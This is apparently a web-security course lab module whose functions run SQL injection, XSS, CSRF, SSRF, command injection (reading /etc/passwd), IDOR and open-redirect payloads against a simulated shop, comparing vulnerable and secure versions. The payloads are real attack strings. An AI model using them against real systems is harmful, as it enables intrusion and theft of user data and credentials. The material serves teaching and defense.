"""The eight course exercises as small attack functions against an in-process shop.

Each function returns (succeeded: bool, evidence: str). The SAME function is run against
VulnerableShop and SecureShop, so the only difference you see is the defense.
Only test systems you own or have written permission to test.
"""

from __future__ import annotations

from urllib.parse import quote, urlencode


def _cookie(app, user: str) -> str:
    pw = {"alice": "alice-lab-pw", "bob": "bob-lab-pw"}[user]
    status, h, _ = app.handle("POST", "/login", body=urlencode({"username": user, "password": pw}))
    return h["Set-Cookie"].split(";")[0]


def sqli_union(app):
    """SQL Injection Fundamentals: UNION-based data theft through the search box."""
    payload = "zzz' UNION SELECT id, username, password_hash FROM users--"
    status, _, body = app.handle("GET", "/search?q=" + quote(payload))
    return ("<li>admin - " in body), f"HTTP {status}, users table leaked: {'<li>admin - ' in body}"


def sqli_login_bypass(app):
    """SQL Injection Fundamentals: log in as admin with no password."""
    status, h, _ = app.handle("POST", "/login", body=urlencode({"username": "admin'--", "password": "x"}))
    return status == 200, f"HTTP {status} for username admin'--"


def reflected_xss(app):
    status, _, body = app.handle("GET", "/search?q=" + quote("<script>alert(1)</script>"))
    return "<script>alert(1)</script>" in body, f"HTTP {status}, raw <script> in page: {'<script>' in body}"


def stored_xss(app):
    c = _cookie(app, "bob")
    app.handle("POST", "/product/1/review", {"Cookie": c}, urlencode({"text": "<img src=x onerror=steal()>"}))
    status, _, body = app.handle("GET", "/product/1")  # any visitor now loads it
    return "<img src=x onerror=steal()>" in body, f"HTTP {status}, raw <img onerror> stored: {'onerror=steal' in body and '<img' in body}"


def csrf_change_email(app):
    """The victim is logged in; a page on evil.example auto-submits a form to the shop."""
    c = _cookie(app, "alice")
    status, _, body = app.handle("POST", "/account/email",
                                 {"Cookie": c, "Origin": "https://evil.example"},
                                 urlencode({"email": "attacker@evil.example"}))
    return status == 200, f"HTTP {status}: {body}"


def ssrf_metadata(app):
    """Exploiting SSRF: make the server read the (FAKE) cloud metadata service."""
    status, _, body = app.handle("GET", "/stock?url=" + quote("http://169.254.169.254/latest/meta-data/iam/"))
    return "FAKE-CANARY" in body, f"HTTP {status}, canary returned: {'FAKE-CANARY' in body}"


def command_injection(app):
    status, _, body = app.handle("GET", "/tools/ping?host=" + quote("127.0.0.1; cat /etc/passwd"))
    ran = [argv for argv in app.shell.executed if argv and argv[0] == "cat"]
    return bool(ran), f"HTTP {status}, injected command reached the shell: {ran or 'no'}"


def idor_read_other_order(app):
    c = _cookie(app, "alice")  # alice owns order 1; order 2 is bob's
    status, _, body = app.handle("GET", "/orders/2", {"Cookie": c})
    return "Kochi" in body, f"HTTP {status}: {body[:40]}"


def open_redirect(app):
    status, h, _ = app.handle("GET", "/logout?next=" + quote("https://evil.example/login"))
    loc = h.get("Location", "")
    return loc.startswith("https://evil.example"), f"HTTP {status}, Location: {loc}"


ALL = [
    ("SQL injection (UNION)", sqli_union),
    ("SQL injection (login bypass)", sqli_login_bypass),
    ("Reflected XSS", reflected_xss),
    ("Stored XSS", stored_xss),
    ("CSRF", csrf_change_email),
    ("SSRF to metadata", ssrf_metadata),
    ("Command injection", command_injection),
    ("IDOR", idor_read_other_order),
    ("Open redirect", open_redirect),
]
